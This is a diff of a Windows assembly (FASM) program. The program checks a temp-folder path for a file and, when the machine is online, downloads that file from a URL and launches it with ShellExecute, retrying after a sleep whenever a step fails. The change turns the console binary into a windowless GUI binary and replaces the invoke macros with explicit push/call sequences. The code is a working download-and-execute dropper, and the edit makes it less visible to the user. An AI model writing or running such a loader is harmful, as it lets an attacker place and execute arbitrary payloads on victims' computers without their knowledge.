@@ -20,7 +20,7 @@
 ;OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 ;SOFTWARE.
 
-format PE console
+format PE GUI 4.0
 entry start
 include 'win32a.inc'
 
@@ -42,39 +42,72 @@ section '.data' data readable writable
 section '.code' code readable executable
 
         start:
-                invoke GetTempPath,tmpDir,tmpDir
+                push tmpDir
+                push tmpDir
+                call [GetTempPath]
 
-                invoke strcpy_s,fileDir,fileDir,tmpDir
-                invoke strcat_s,fileDir,fileDir,fileName
+                push tmpDir
+                push fileDir
+                push fileDir
+                call [strcpy_s]
 
-                invoke strcpy_s,param,param,s1
-                invoke strcat_s,param,param,fileDir
+                push fileName
+                push fileDir
+                push fileDir
+                call [strcat_s]
+
+                push s1
+                push param
+                push param
+                call [strcpy_s]
+
+                push fileDir
+                push param
+                push param
+                call [strcat_s]
+
 restart:
-                invoke PathFileExists,fileDir
+                push fileDir
+                call [PathFileExists]
                 cmp eax,0
                 jz download ; false
-                jne run     ; true
+                jne execute ; true
 download:
-                invoke InternetGetConnectedState,0,0
+                push 0
+                push 0
+                call [InternetGetConnectedState]
                 cmp eax,0
                 jz sleep ; false
 
-                invoke URLDownloadToFile,0,url,fileDir,0,0
+                push 0
+                push 0
+                push fileDir
+                push url
+                push 0
+                call [URLDownloadToFile]
                 cmp eax,0
-                jne sleep ; false
-                jz run    ; true
-run:
-                invoke ShellExecute,0,s2,s3,param,0,0
+                jne sleep  ; false
+                jz execute ; true
+execute:
+                push 0
+                push 0
+                push param
+                push s3
+                push s2
+                push 0
+                call [ShellExecute]
                 jmp exit
 sleep:
-                mov eax,sleepSeconds
+                mov eax,[sleepSeconds]
                 mov ebx,1000
                 mul ebx
 
-                invoke Sleep,eax
+                push eax
+                call [Sleep]
                 jmp restart
 exit:
-                invoke ExitProcess,0
+                push 0
+                call [ExitProcess]
 
 section '.idata' import data readable
 
